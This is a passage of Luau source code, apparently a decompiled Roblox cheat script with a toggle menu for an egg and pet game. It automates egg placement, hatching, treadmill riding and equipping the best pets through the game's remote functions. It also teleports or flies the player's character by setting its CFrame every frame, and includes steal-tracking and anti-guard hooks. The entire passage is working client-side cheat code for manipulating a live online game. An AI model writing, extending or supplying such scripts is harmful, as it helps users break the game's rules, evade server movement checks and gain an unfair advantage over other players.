				end)

				local flag8 = type(v22) == "table" and type(v22.GetAssetEquipCapacity) == "function"
				local ok = nil

				if flag8 then
					local result
					ok, result = pcall(v22.GetAssetEquipCapacity, flag6 and tonumber(flag6.BaseUpgradeLevel) or 0)
					ok = ok and tonumber(result) or nil
				end

				if not ok then
					local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

					if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
						local result
						ok, result = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)
						ok = ok and tonumber(result) or nil
					end
				end

				local n20 = ok or 0
				return n20 - n18 - n19, n20, n18, n19
			end

			local n18 = -0.5
			local n19 = -24

			local function fn19()
				local eggState = tbl.EggState
				local tbl30 = {}
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl30
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl30
				end

				for _, v22 in pairs(result) do
					local placement = type(v22) == "table" and v22.Placement or nil
					local localCFrame = type(placement) == "table" and placement.LocalCFrame or nil

					if typeof(localCFrame) == "CFrame" then
						table.insert(tbl30, Vector2.new(localCFrame.Position.X, localCFrame.Position.Z))
					end
				end

				return tbl30
			end

			local v22 = Random.new()

			local function fn20(arg)
				local tbl30 = {}

				for i = n19, 8, 4 do
					for i2 = 4, 30, 4 do
						local vector2 = Vector2.new(i, i2)
						local flag4 = true

						for _, v23 in ipairs(arg) do
							if (v23 - vector2).Magnitude < n9 then
								flag4 = false
								break
							end
						end

						if flag4 then
							table.insert(tbl30, CFrame.new(i, n18, i2))
						end
					end
				end

				for i = #tbl30, 2, -1 do
					local v23 = v22:NextInteger(1, i)
					local v24 = tbl30[i]
					tbl30[i] = tbl30[v23]
					tbl30[v23] = v24
				end

				return tbl30
			end

			local function fn21()
				local v23, v24, v25, v26 = fn18()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n20 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

					if ok and type(result) == "table" then
						for _, v27 in pairs(result) do
							if type(v27) == "table" and v27.Placement == nil then
								n20 += 1
							end
						end
					end
				end

				str2 = string.format("Eggs placed %d/%d  -  %d/%d pets equipped, %d in bag", v25, 30, v26, v24, n20)
				return v23, v25
			end

			local function fn22(arg, arg2)
				local v23 = tbl4.Root()
				if not v23 then
					return false
				end
				local position = v23.Position
				local n20 = (arg - position).Magnitude / math.max(400, 1) + 3
				local flag4 = nil
				local n21 = 0

				local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
					if flag4 ~= nil or tbl4.AntiGuard.Busy then
						return
					end
					n21 += deltaTime
					local v24 = tbl4.Root()
					if not v24 or arg2() or n21 > n20 then
						flag4 = false
						return
					end

					if (v24.Position - position).Magnitude > 6 then
						position = v24.Position
					end

					local n22 = arg - position
					local n23 = n7 * deltaTime
					local flag5 = n22.Magnitude <= math.max(n23, 0.05)
					position = flag5 and arg or position + n22.Unit * n23
					local vector = Vector3.new(n22.X, 0, n22.Z)
					local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v24.CFrame.Rotation

					pcall(function()
						v24.CFrame = CFrame.new(position) * cframe
						v24.AssemblyLinearVelocity = Vector3.zero
						v24.AssemblyAngularVelocity = Vector3.zero
					end)

					if flag5 then
						flag4 = true
					end
				end)

				while flag4 == nil do
					RunService.Heartbeat:Wait()
				end

				connection2:Disconnect()
				return flag4
			end

			local function fn23()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("SeparationLine")
				return world and world:IsA("BasePart") and world.Position.X or 552
			end

			local fn24 = nil

			local function fn25(arg)
				local v23 = tbl4.Root()
				if not v23 or type(tbl4.StealHome) ~= "function" then
					return nil
				end
				local v24 = fn23()
				if v23.Position.X < v24 == arg.X < v24 then
					return nil
				end
				local ok, result = pcall(tbl4.StealHome)
				if not ok or typeof(result) ~= "Vector3" then
					return nil
				end

				if (result - arg).Magnitude <= 12 or (v23.Position - result).Magnitude <= 12 then
					return nil
				end
				return result
			end

			fn24 = function(arg, arg2, arg3, arg4)
				local v23 = tbl4.Root()
				if not v23 then
					return false
				end

				if not arg4 then
					local v24 = fn25(arg)
					if v24 and not fn24(v24, arg2, arg3, true) then
						return false
					end

					if arg2 and arg2() then
						return false
					end
					v23 = tbl4.Root()
					if not v23 then
						return false
					end
				end

				tbl4.Shield(arg3 or "place", true)
				tbl4.Driving = tbl4.Driving + 1
				task.wait(0.2)
				local n20 = arg + Vector3.new(0, 3, 0)
				local n21 = math.max(v23.Position.Y, n20.Y) + n17

				local ok, result = pcall(function()
					return fn22(Vector3.new(v23.Position.X, n21, v23.Position.Z), arg2) and fn22(Vector3.new(n20.X, n21, n20.Z), arg2) and fn22(n20, arg2)
				end)

				ok = ok and result == true
				tbl4.Driving = math.max(0, tbl4.Driving - 1)
				tbl4.Shield(arg3 or "place", false)
				return ok
			end

			tbl4.FlyTo = function(arg, arg2, arg3)
				return fn24(arg, arg2, arg3 or "fly")
			end

			local function fn26()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.PlantEgg) ~= "function" then
					return false
				end
				local v23 = fn16()
				if not fn17(#v23) then
					return false
				end
				fn21()
				local v24, v25, v26 = fn18()
				local n20 = n14 - (tonumber(v26) or 0)
				if n20 <= 0 then
					return false
				end
				local v27 = tbl4.PenAnchor()
				if not v27 then
					return false
				end
				tbl4.Movement.PlaceWanted = true
				if not tbl4.ClaimMovement("place") then
					return "waiting"
				end
				local v28 = n16

				local function fn27()
					local flag4 = tbl4.Toggle(placeEggHandle, false) == true
					local flag5 = v28 ~= n16

					if not flag5 then
						flag5 = not (flag4 or tbl4.Lab.PlaceOn)
					end

					if flag5 then
						return true
					end

					if tbl4.IsNight() then
						return false
					end
					return flag4 and v19 == tbl25[4] or tbl4.Movement.StealFirst
				end

				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					tbl4.ExitBelt()
				end

				local function fn28()
					tbl4.HoldBelt()
					local ok, result = pcall(fn24, v27, fn27)
					tbl4.ReleaseBelt()
					return ok and result and true or false
				end

				if tbl4.DistanceTo(v27) > n10 then
					str2 = "Flying to the pen"

					if not fn28() then
						tbl4.LeaveBelt()
						n13 = os.clock() + n11
						return false
					end
				end

				tbl4.LeaveBelt()
				if fn27() then
					return false
				end

				local function fn29()
					if tbl4.DistanceTo(v27) <= n10 then
						return true
					end

					if fn27() then
						return false
					end
					str2 = "Pen out of reach, flying back"
					return fn28() and tbl4.DistanceTo(v27) <= n10
				end

				if not fn29() then
					str2 = "Could not reach the pen, trying again soon"
					n13 = os.clock() + n11
					return false
				end

				local v29 = fn19()
				local n21 = 0
				local n22 = 0

				for _, v30 in ipairs(v23) do
					if not (n21 >= n20 or fn27()) then
						if not fn29() then
							str2 = "Pen out of reach, stopping this pass"
							break
						else
							local ok, result = pcall(eggState.WearEggTool, v30.Uid)

							if ok and result ~= false then
								task.wait(0.15)
								local n23 = 0
								local flag4 = false

								for _, v31 in ipairs(fn20(v29)) do
									if not (fn27() or n23 >= n12) then
										n23 += 1
										local AskPlaceEgg, v32 = fn11("RF/EggWorld/AskPlaceEgg", { Uid = v30.Uid, LocalCFrame = v31 })

										if AskPlaceEgg and v32 ~= false then
											table.insert(v29, Vector2.new(v31.Position.X, v31.Position.Z))
											n21 += 1
											flag4 = true
											break
										else
											continue
										end
									end

									break
								end

								if flag4 then
									n22 = 0
									continue
								else
									tbl29[v30.Uid] = true
									n22 += 1
									if not (n22 >= 2) then
										continue
									end
								end
							else
								tbl29[v30.Uid] = true
								continue
							end
						end
					end

					break
				end

				if type(eggState.DoffEggTool) == "function" then
					pcall(eggState.DoffEggTool)
				end

				if n21 == 0 then
					n13 = os.clock() + n11
				end

				return n21 > 0
			end

			tbl3.Add(function()
				local v23, v24 = fn21()

				if placeEggStatusRow and type(placeEggStatusRow.Set) == "function" then
					pcall(placeEggStatusRow.Set, placeEggStatusRow, str2)
				end

				local num = tonumber(v24)
				local flag4 = num ~= nil and v21 ~= nil and num < v21

				if num then
					v21 = num
				end

				if flag4 then
					table.clear(tbl29)
				end

				if not tbl4.Toggle(placeEggHandle, false) and not tbl4.Lab.PlaceOn then
					tbl4.Movement.PlaceWanted = false
					tbl4.ReleaseMovement("place")
					return false
				end

				if flag3 then
					return false
				end

				if os.clock() < n13 then
					tbl4.Movement.PlaceWanted = false
					return false
				end

				if tbl4.Movement.StealFirst and not tbl4.IsNight() then
					tbl4.Movement.PlaceWanted = false
					return false
				end
				flag3 = true

				task.spawn(function()
					local ok, result = pcall(fn26)

					if not (ok and result == "waiting") then
						tbl4.Movement.PlaceWanted = false
					end

					tbl4.ReleaseMovement("place")
					flag3 = false
					tbl3.Wake()
				end)

				return false
			end)

			placeEggHandle = tbl4.PlaceEggHandle
			placeEggStatusRow = tbl4.PlaceEggStatusRow

			tbl4.PlaceEggRestart = function()
				table.clear(tbl29)
				n16 += 1
				tbl4.StopWalking()
				tbl3.Wake()
			end

			tbl4.PlaceEggRefresh = function()
				table.clear(tbl29)
				tbl3.Wake()
			end

			tbl4.Rift.Restart.Place = function()
				table.clear(tbl29)
				tbl3.Wake()
			end
		end

		local save = tbl.Save

		if type(save) == "table" and type(save.FieldSignal) == "function" then
			for _, v21 in ipairs({ "EggInventory", "EquippedAssets", "BaseUpgradeLevel" }) do
				local ok, result = pcall(save.FieldSignal, v21)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl3.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		tbl4.Steal.HeldByMe = function()
			local carryUid = tbl4.Steal.CarryUid
			local character = localPlayer.Character
			if type(carryUid) ~= "string" or not character then
				return false
			end
			local v21 = workspace:FindFirstChild(carryUid)
			if not v21 then
				return false
			end

			for _, descendant in ipairs(v21:GetDescendants()) do
				if descendant:IsA("WeldConstraint") or descendant:IsA("JointInstance") then
					local ok, result, result2 = pcall(function()
						return descendant.Part0, descendant.Part1
					end)

					local v22

					if ok then
						v22 = result and result:IsDescendantOf(character) or result2 and result2:IsDescendantOf(character)
					else
						v22 = ok
					end

					if v22 then
						return true
					end
				end
			end

			return false
		end

		do
			local n9 = 0

			local connection2 = RunService.Heartbeat:Connect(function(deltaTime)
				n9 += deltaTime
				if n9 < 0.2 then
					return
				end
				n9 = 0
				local steal = tbl4.Steal

				if not steal.Carrying then
					if steal.GuessedDrop then
						local ok, result = pcall(steal.HeldByMe)

						if ok and result then
							steal.GuessedDrop = false
							steal.Carrying = true
							steal.HeldSeenAt = os.clock()
						end
					end

					return
				end

				local ok, result = pcall(steal.HeldByMe)
				if not ok or result then
					steal.HeldSeenAt = os.clock()
					return
				end

				if os.clock() - (steal.HeldSeenAt or 0) > 0.8 then
					steal.Carrying = false
					steal.GuessedDrop = true
					steal.LastFinishedAt = os.clock()
					tbl3.Wake()
				end
			end)

			fn4(function()
				pcall(function()
					connection2:Disconnect()
				end)
			end)
		end

		do
			local eggState = tbl.EggState
			local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

			if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
				local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
					local carrying = type(arg) == "table" and arg.IsCarrying == true

					if tbl4.Steal.Carrying and not carrying then
						tbl4.Steal.LastFinishedAt = os.clock()
					end

					tbl4.Steal.GuessedDrop = false

					if carrying then
						tbl4.Steal.HeldSeenAt = os.clock()
					end

					if carrying and type(arg.Uid) == "string" then
						tbl4.Steal.CarryUid = arg.Uid
						tbl4.Steal.CarryAreaId = arg.AreaId
						local mult = tonumber(arg.SpeedMultiplier)

						if mult and mult > 0 then
							tbl4.SafeCarry.Mult = mult
							tbl4.SafeCarry.Category = arg.AssetCategory

							if arg.AssetCategory ~= nil then
								local str2 = tostring(arg.AssetCategory)
								tbl4.SafeCarry.Seen[str2] = math.min(tbl4.SafeCarry.Seen[str2] or mult, mult)
							end
						end
					end

					tbl4.Steal.Carrying = carrying
					tbl3.Wake()
				end)

				if ok and result then
					fn4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		pcall(function()
			local reEggWorldFieldEggRedeemVerdict = networking:FindFirstChild("RE/EggWorld/FieldEggRedeemVerdict")
			local reAlertsRaise = networking:FindFirstChild("RE/Alerts/Raise")

			if reEggWorldFieldEggRedeemVerdict and reEggWorldFieldEggRedeemVerdict:IsA("RemoteEvent") then
				local connection2 = reEggWorldFieldEggRedeemVerdict.OnClientEvent:Connect(function()
					tbl4.SafeCarry.LastDelivered = os.clock()
				end)

				fn4(function()
					connection2:Disconnect()
				end)
			end

			if reAlertsRaise and reAlertsRaise:IsA("RemoteEvent") then
				local connection2 = reAlertsRaise.OnClientEvent:Connect(function(arg)
					if type(arg) == "table" and type(arg.Text) == "string" and string.find(arg.Text, "Delivery failed", 1, true) then
						tbl4.SafeCarry.LastFailed = os.clock()
					end
				end)

				fn4(function()
					connection2:Disconnect()
				end)
			end
		end)

		do
			local n9 = 10
			local n10 = 1
			local n11 = 5

			local function fn11(arg)
				local v21 = networking:FindFirstChild(arg)
				if not v21 or not v21:IsA("RemoteFunction") then
					return false, nil, nil
				end
				local ok, result, result2 = pcall(v21.InvokeServer, v21)
				return ok, result, result2
			end

			local n12 = 0
			local flag3 = false

			local function fn12(arg, arg2, arg3)
				if arg and arg2 ~= false then
					n12 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Already using treadmill" then
					n12 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Not grounded" and tbl4.Grounded() then
					n12 += 1

					if n12 >= 2 then
						n12 = 0

						if not flag3 then
							flag3 = true
							pcall(tbl4.UndoSwap)
						elseif type(tbl4.RequestRespawn) == "function" then
							flag3 = false
							tbl4.RequestRespawn()
						end
					end
				end

				return false
			end

			local v21 = nil
			local v22 = nil
			local flag4 = false
			local n13 = 0
			local flag5 = false
			local treadmill = tbl4.Treadmill

			local function fn13()
				return tbl4.Toggle(v21, false)
			end

			local function fn14()
				local movement = tbl4.Movement
				return movement.PlaceWanted or movement.ScrambleWanted or movement.MutationWanted or movement.FracturedWanted or movement.Owner ~= nil and movement.Owner ~= "treadmill" or tbl4.Steal.Active or tbl4.Steal.Carrying
			end

			local function fn15()
				local v23 = n13
				if fn14() or not tbl4.ClaimMovement("treadmill") then
					return false
				end

				local function fn16()
					return v23 ~= n13 or not fn13() or tbl4.Movement.Owner ~= "treadmill" or fn14()
				end

				if tbl4.BeltHeld() then
					tbl4.ResetBelt()
				end

				local v24 = tbl4.Belt()
				if not v24 then
					return false
				end
				local n14 = v24.Position + Vector3.new(0, v24.Size.Y / 2, 0)

				if n9 < tbl4.DistanceTo(n14 + Vector3.new(0, 2, 0)) then
					if type(tbl4.FlyTo) ~= "function" or not tbl4.FlyTo(n14, fn16, "treadmill") then
						return false
					end
				end

				if fn16() then
					return false
				end
				treadmill.Riding = fn12(fn11("RF/Treadmill/AskWearStill"))
				return treadmill.Riding
			end

			tbl3.Add(function()
				if not fn13() then
					if treadmill.Riding and not flag4 then
						flag4 = true

						task.spawn(function()
							pcall(tbl4.ExitBelt)
							flag4 = false
							tbl3.Wake()
						end)
					end

					return false
				end

				if flag4 or fn14() then
					return false
				end

				if treadmill.Riding and tbl4.Toggle(v22, true) and tbl4.OnBelt() then
					if os.clock() >= (treadmill.NextCheck or 0) and not tbl4.Flying and tbl4.Grounded() then
						treadmill.NextCheck = os.clock() + n11
						flag4 = true

						task.spawn(function()
							local ok, result = pcall(function()
								return fn12(fn11("RF/Treadmill/AskWearStill"))
							end)

							treadmill.Riding = ok and result == true

							if not treadmill.Riding then
								treadmill.NextTry = 0
							end

							flag4 = false
							tbl3.Wake()
						end)
					end

					return false
				end

				if os.clock() < (treadmill.NextTry or 0) then
					return false
				end
				treadmill.NextCheck = 0
				treadmill.NextTry = os.clock() + (treadmill.LastFailed and 3 or 4)
				flag4 = true

				task.spawn(function()
					local ok, result = pcall(fn15)
					treadmill.LastFailed = not (ok and result == true)
					tbl4.ReleaseMovement("treadmill")
					flag4 = false
					tbl3.Wake()
				end)

				return false
			end)

			task.spawn(function()
				while not flag5 do
					task.wait(3)

					if not fn13() and not fn14() and not tbl4.Flying and tbl4.OnBelt() and tbl4.Grounded() then
						fn12(fn11("RF/Treadmill/AskWearStill"))
					end
				end
			end)

			task.spawn(function()
				local n14 = 0

				while not flag5 do
					local v23 = task.wait(0.25)

					if not fn13() or not treadmill.Riding or fn14() then
						n14 = 0
					elseif tbl4.OnBelt() then
						n14 = 0
					else
						n14 += v23

						if n14 >= 1.5 then
							treadmill.Riding = false
							treadmill.NextTry = 0
							tbl3.Wake()
							n14 = 0
						end
					end
				end
			end)

			task.spawn(function()
				local n14 = 0
				local n15 = 0
				local position = nil

				while not flag5 do
					local v23 = task.wait(0.25)
					n14 = math.max(0, n14 - v23)
					local flag6 = treadmill.Riding and fn13() and not fn14()
					local v24 = tbl4.Root()
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if flag6 or not (tbl4.Flying or tbl4.Movement.Owner ~= nil or tbl4.Movement.PlaceWanted or character ~= nil and character.MoveDirection.Magnitude > 0.1) or not v24 or not tbl4.OnBelt() then
						position = v24 and v24.Position
						n15 = 0
						position = position or nil
					else
						local vector = Vector3.new(v24.Position.X, 0, v24.Position.Z)
						position = position and (vector - Vector3.new(position.X, 0, position.Z)).Magnitude < 0.5

						if position then
							n15 += v23
						else
							n15 = 0
						end

						position = v24.Position

						if n15 >= n10 and n14 <= 0 then
							pcall(tbl4.ExitBelt)
							n14 = 1.5
							n15 = 0
						end
					end
				end
			end)

			fn4(function()
				flag5 = true
				treadmill.Riding = false
			end)

			v21 = v15:CreateToggle({
				Name = "Auto Treadmill",
				Default = false,
				Callback = function()
					n13 += 1
					tbl4.StopWalking()
					tbl3.Wake()
				end,
			})

			v22 = v15:CreateToggle({ Name = "Stay On Treadmill", Default = true })
		end

		do
			local n9 = 4
			local n10 = 10
			local v21 = nil
			local flag3 = false
			local n11 = 0
			local tbl29 = {}
			local tbl30 = { MinRarity = 0, MinIncome = 0, Eggs = {} }

			local function fn11(arg, arg2)
				local v22 = networking:FindFirstChild(arg)
				if not v22 or not v22:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v22.InvokeServer, v22, arg2)
			end

			local function fn12(arg)
				local flag4 = tbl30.MinRarity > 0
				local flag5

				if flag4 then
					local minRarity = tbl30.MinRarity
					flag5 = tbl4.EggRarity(arg) < minRarity
				else
					flag5 = flag4
				end

				if flag5 then
					return false
				end
				local flag6 = tbl30.MinIncome > 0

				if flag6 then
					local minIncome = tbl30.MinIncome
					flag6 = tbl4.EggIncome(arg) < minIncome
				end

				if flag6 then
					return false
				end

				if next(tbl30.Eggs) ~= nil and tbl30.Eggs[tostring(arg.AssetCategory)] ~= true then
					return false
				end
				return true
			end

			local function fn13()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local flag4 = tbl4.Toggle(v21, false) == true
				local Hatch = tbl4.RiftOn("Hatch") and tbl4.RiftShortfall() or {}
				local tbl31 = {}
				local tbl32 = {}

				for k, v22 in pairs(result) do
					local flag5 = type(v22) == "table" and v22.Placement ~= nil

					if flag5 then
						flag5 = (tbl29[k] or 0) <= os.clock()
					end

					if flag5 then
						local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

						if ok2 and result2 == true then
							local str2 = tostring(v22.AssetCategory)

							if (Hatch[str2] or 0) > 0 then
								Hatch[str2] = Hatch[str2] - 1
								table.insert(tbl31, k)
							elseif flag4 and fn12(v22) then
								table.insert(tbl32, k)
							end
						end
					end
				end

				for _, v22 in ipairs(tbl32) do
					table.insert(tbl31, v22)
				end

				return tbl31
			end

			local function fn14()
				return tbl4.Toggle(v21, false) or tbl4.RiftOn("Hatch")
			end

			local function fn15()
				local v22 = n11
				local v23 = fn13()
				local n12 = 0

				for _, v24 in ipairs(v23) do
					if not (n12 >= n9 or v22 ~= n11 or not fn14()) then
						local AskHatch, v25 = fn11("RF/EggWorld/AskHatch", v24)

						if AskHatch and v25 ~= false then
							task.wait(0.35)
							fn11("RF/EggWorld/AskFinishHatch", v24)
							n12 += 1
							tbl29[v24] = nil
						else
							tbl29[v24] = os.clock() + n10
						end

						task.wait(0.2)
						continue
					end

					break
				end

				return n12 > 0
			end

			tbl3.Add(function()
				if not fn14() or flag3 then
					return false
				end
				flag3 = true

				task.spawn(function()
					pcall(fn15)
					flag3 = false
				end)

				return false
			end)

			local function hatch()
				n11 += 1
				table.clear(tbl29)
				tbl3.Wake()
			end

			v21 = v16:CreateToggle({ Name = "Auto Hatch", Default = false, Callback = hatch })

			v16:CreateDropdown({
				Name = "Hatch Min Rarity",
				Note = "Hatch eggs of the chosen rarity and every rarity above it",
				Options = tbl13,
				Default = tbl13[1],
				SubOf = v21,
				Callback = function(arg)
					tbl30.MinRarity = tbl14[arg] or 0
					hatch()
				end,
			})

			local tbl31 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local tbl32 = { Slider = nil, Value = 0, Unit = "M/s" }

			local function fn16(arg, arg2)
				if arg ~= nil then
					tbl32.Value = math.max(0, math.floor(tonumber(arg) or tbl32.Value))
				end

				if arg2 ~= nil then
					tbl32.Unit = tostring(arg2)
				end

				tbl30.MinIncome = tbl32.Value * (tbl31[tbl32.Unit] or tbl31["M/s"]).Mult
				hatch()
			end

			tbl32.Slider = fn5(v16, {
				Name = "Min Hatch Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = v21,
				Legacy = "Hatch Min Value",
				SectionName = "Auto Hatch & Equip",
				OnRaw = function(arg)
					fn16(math.floor(arg / 1000), "K/s")
				end,
			})

			local tbl33 = {}
			local tbl34 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local n12 = 0

			while (type(directory) ~= "table" or next(directory) == nil) and n12 < 2 do
				n12 += task.wait(0.1)

				if type(tbl.Assets) ~= "table" then
					tbl.Assets = fn2(function()
						return ReplicatedStorage.Data.Assets
					end)
				end

				directory = tbl.Assets and tbl.Assets.Directory
			end

			local tbl35 = {}

			if type(directory) == "table" then
				for k, v22 in pairs(directory) do
					local rarity = type(v22) == "table" and v22.Rarity or nil
					local flag4 = type(rarity) == "table"
					local num

					if flag4 then
						num = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						num = flag4
					end

					num = num or nil

					if num then
						table.insert(tbl35, {
							Category = tostring(k),
							Name = tostring(v22.DisplayName or k),
							Rarity = num,
							RarityName = tostring(rarity.DisplayName or rarity._id or num),
						})
					end
				end
			end

			table.sort(tbl35, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v22 in ipairs(tbl35) do
				local str2 = string.format("%s [%s]", v22.Name, v22.RarityName)

				if tbl34[str2] then
					str2 = string.format("%s [%s] (%s)", v22.Name, v22.RarityName, v22.Category)
				end

				table.insert(tbl33, str2)
				tbl34[str2] = v22.Category
			end

			if #tbl33 > 0 then
				fn6(v16:CreateMultiDropdown({
					Name = "Hatch Specific Eggs",
					Note = "Only hatch these eggs (empty = all)",
					Options = tbl33,
					Default = {},
					SubOf = v21,
					Callback = function(arg)
						local eggs = {}

						if type(arg) == "table" then
							for k, v22 in pairs(arg) do
								k = v22 == true and type(k) == "string" and k or type(v22) == "string" and v22 or nil

								if k and tbl34[k] then
									eggs[tbl34[k]] = true
								end
							end
						end

						tbl30.Eggs = eggs
						hatch()
					end,
				}))
			end

			tbl4.Rift.Restart.Hatch = hatch
		end

		do
			local n9 = 5
			local n10 = 30
			local v21 = nil
			local flag3 = false
			local n11 = 0
			local tbl29 = {}
			local n12 = 0
			local flag4 = true
			local v22 = nil
			local n13 = -math.huge

			local function fn11(arg)
				local v23 = fn2(function()
					return ReplicatedStorage.Data.Bases
				end)

				if type(v23) == "table" and type(v23.GetAssetEquipCapacity) == "function" then
					local ok, result = pcall(v23.GetAssetEquipCapacity, arg and tonumber(arg.BaseUpgradeLevel) or 0)
					if ok and tonumber(result) then
						return math.floor(tonumber(result))
					end
				end

				if v22 and os.clock() - n13 < n10 then
					return v22
				end
				local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

				if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
					local ok, result = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)

					if ok and tonumber(result) then
						local n14 = math.floor(tonumber(result))
						local now = os.clock()
						v22 = n14
						n13 = now
						return v22
					end
				end

				return v22 or 0
			end

			local function fn12(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag5 = type(directory) == "table" and directory[tostring(arg.Category)] or nil
				local n14 = type(flag5) == "table" and tonumber(flag5.EarningRate) or 0
				local n15 = tonumber(arg.Scale) or 0
				if n14 <= 0 or n15 <= 0 then
					return 0
				end
				local n16 = n15 > 5 and (n15 / 5) ^ 1.2 * 19.637875755794113 or n15 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n17 = 1

				if flag6 then
					local ok
					ok, n17 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n17) == "number"
					local n18 = 1

					if not ok then
						n17 = n18
					end
				end

				return n14 * n16 * n17
			end

			local function fn13()
				local save2 = tbl.Save
				local flag5 = type(save2) == "table" and type(save2.Get) == "function"
				local result = nil

				if flag5 then
					local ok
					ok, result = pcall(save2.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return nil
				end
				local tbl30 = {}
				local tbl31 = {}
				local v23 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in v23(equippedAssets) do
					if type(equippedAsset) == "string" then
						tbl30[equippedAsset] = true
						table.insert(tbl31, equippedAsset)
					end
				end

				local tbl32 = {}
				local v24 = pairs
				local inventory = result.Inventory or {}

				for k, v25 in v24(inventory) do
					if type(v25) == "table" and v25.InFuse ~= true then
						table.insert(tbl32, { Uid = k, Income = fn12(v25), Equipped = tbl30[k] == true })
					end
				end

				table.sort(tbl32, function(arg, arg2)
					if arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end
					return tostring(arg.Uid) < tostring(arg2.Uid)
				end)

				return tbl32, tbl30, #tbl31, result
			end

			local function fn14(arg, arg2)
				local tbl30 = {}
				local flag5 = false

				for i, v23 in ipairs(arg) do
					if not (i > arg2) then
						if not v23.Equipped then
							table.insert(tbl30, v23.Uid)

							if not tbl29[v23.Uid] then
								flag5 = true
							end
						end

						continue
					end

					break
				end

				return tbl30, flag5
			end

			tbl3.Add(function()
				if not tbl4.Toggle(v21, false) then
					return false
				end
				local v23, v24, v25, v26 = fn13()

				if v23 then
					local v27 = fn11(v26)
					local v28, v29 = fn14(v23, v27)

					if (v29 or flag4) and not flag3 and os.clock() >= n12 then
						for _, v30 in ipairs(v28) do
							tbl29[v30] = true
						end

						flag4 = false
						flag3 = true
						n12 = os.clock() + n9
						local v30 = n11

						task.spawn(function()
							local rfHaulFetchWearBestStatus = networking:FindFirstChild("RF/Haul/FetchWearBestStatus")
							local isRemoteFunction = rfHaulFetchWearBestStatus and rfHaulFetchWearBestStatus:IsA("RemoteFunction")
							local flag5 = true

							if isRemoteFunction then
								local ok, result = pcall(rfHaulFetchWearBestStatus.InvokeServer, rfHaulFetchWearBestStatus)
								flag5 = ok and result ~= false and result ~= nil
							end

							local rfHaulWearBest = networking:FindFirstChild("RF/Haul/WearBest")

							if flag5 and v30 == n11 and rfHaulWearBest and rfHaulWearBest:IsA("RemoteFunction") then
								pcall(rfHaulWearBest.InvokeServer, rfHaulWearBest)
							end

							flag3 = false
							tbl3.Wake()
						end)
					end
				end

				return false
			end)

			v21 = v16:CreateToggle({
				Name = "Auto Equip Best",
				Note = "Equip Best when a better pet appears",
				Default = false,
				Callback = function()
					n11 += 1
					table.clear(tbl29)
					n12 = 0
					flag4 = true
					tbl3.Wake()
				end,
			})

			local save2 = tbl.Save

			if type(save2) == "table" and type(save2.FieldSignal) == "function" then
				for _, v23 in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, result = pcall(save2.FieldSignal, v23)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							flag4 = true
							tbl3.Wake()
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end
		end

		local n9
		n9 = 3
		local n10
		n10 = 50
		local tbl29
		tbl29 = { "Rarity Only", "Value Only", "Rarity And Value", "Rarity Or Value" }
		local tbl30, tbl31, tbl32, tbl33, v21

		do
			local v22 = fn2(function()
				return ReplicatedStorage.Shared.Util.AssetItems
			end)

			tbl30 = {}
			tbl31 = {}
			tbl32 = {}
			tbl33 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl34 = {}
			local tbl35 = {}

			if type(directory) == "table" then
